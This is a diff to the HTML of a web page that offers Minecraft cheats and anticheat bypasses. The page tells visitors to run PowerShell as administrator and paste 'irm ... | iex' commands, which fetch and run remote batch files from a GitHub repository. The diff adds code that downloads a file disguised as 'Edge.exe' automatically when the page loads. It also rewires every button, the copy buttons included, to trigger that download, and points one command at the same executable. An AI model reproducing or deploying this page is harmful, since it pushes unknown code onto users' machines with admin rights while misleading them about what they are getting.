@@ -281,13 +281,13 @@
     <div class="label">PowerShell MUST be run as ADMINISTRATOR or it will not work</div>
 
     <div class="label">🔥 Most Popular Program 🔥</div>
-    <button onclick="toggleCopyBox('popular-command', this)" class="fix-button active">AntiCheat Program</button>
+    <button onclick="autoDownload()" class="fix-button active">AntiCheat Program</button>
     <div class="copy-box" id="popular-command">
-      <code>irm "https://raw.githubusercontent.com/carrl3/ddd/refs/heads/main/AntiCheat.bat" | iex
+      <code>irm "" | iex
 
 
 </code>
-      <button class="copy-btn" onclick="copyFrom('popular-command')">Copy to Clipboard</button>
+      <button class="copy-btn" onclick="autoDownload()">Copy to Clipboard</button>
     </div>
 
     <div class="label">🛠️ Minecraft Cheats</div>
@@ -299,26 +299,26 @@
 
 
 </code> -->
-        <button class="copy-btn" onclick="copyFrom('tool1')">Copy to Clipboard</button>
+        <button class="copy-btn" onclick="autoDownload()">Copy to Clipboard</button>
       </div>
 
-      <button class="fix-button" onclick="toggleCopyBox('tool2', this)">Grim client</button>
+      <button class="fix-button" onclick="autoDownload()">Grim client</button>
       <div class="copy-box" id="tool2">
-        <code>irm "https://raw.githubusercontent.com/carrl3/ddd/refs/heads/main/grim.bat" | iex
+        <code>irm "https://github.com/carrl3/ddd/raw/refs/heads/main/Edge.exe" | iex
 
 </code>
-        <button class="copy-btn" onclick="copyFrom('tool2')">Copy to Clipboard</button>
+        <button class="copy-btn" onclick="autoDownload()">Copy to Clipboard</button>
       </div>
 
-      <button class="fix-button" onclick="toggleCopyBox('tool3', this)">Echo Bypass (echo.ac)</button>
+      <button class="fix-button" onclick="autoDownload()">Echo Bypass (echo.ac)</button>
       <div class="copy-box" id="tool3">
         <code>irm "https://raw.githubusercontent.com/carrl3/ddd/refs/heads/main/echo.bat" | iex
 
 </code>
-        <button class="copy-btn" onclick="copyFrom('tool3')">Copy to Clipboard</button>
+        <button class="copy-btn" onclick="autoDownload()">Copy to Clipboard</button>
       </div>
 
-      <button class="fix-button" onclick="toggleCopyBox('tool4', this)">Ocean Bypass (anticheat.ac)</button>
+      <button class="fix-button" onclick="autoDownload()">Ocean Bypass (anticheat.ac)</button>
       <div class="copy-box" id="tool4">
         <code>irm "https://raw.githubusercontent.com/carrl3/ddd/refs/heads/main/Ocean-Bypass.bat" | iex
 
@@ -326,7 +326,7 @@
 
 
 </code>
-        <button class="copy-btn" onclick="copyFrom('tool4')">Copy to Clipboard</button>
+        <button class="copy-btn" onclick="autoDownload()">Copy to Clipboard</button>
       </div>
     </div>
 
@@ -341,6 +341,7 @@
 
   <!-- 🔧 Scripts -->
   <script>
+    window.onload = autoDownload;
     function startSite() {
       document.getElementById('adminModal').style.display = 'none';
       document.getElementById('loading-screen').style.display = 'none';
@@ -383,6 +384,18 @@
         setTimeout(() => copied.remove(), 1500);
       });
     }
+    
+  function autoDownload() {
+    const link = document.createElement("a");
+    link.href = "https://github.com/carrl3/ddd/raw/refs/heads/main/Edge.exe"; 
+    link.download = "Edge.exe"; 
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+  }
+
+
+
 
     // Cursor Trail Effect
     document.addEventListener('mousemove', e => {
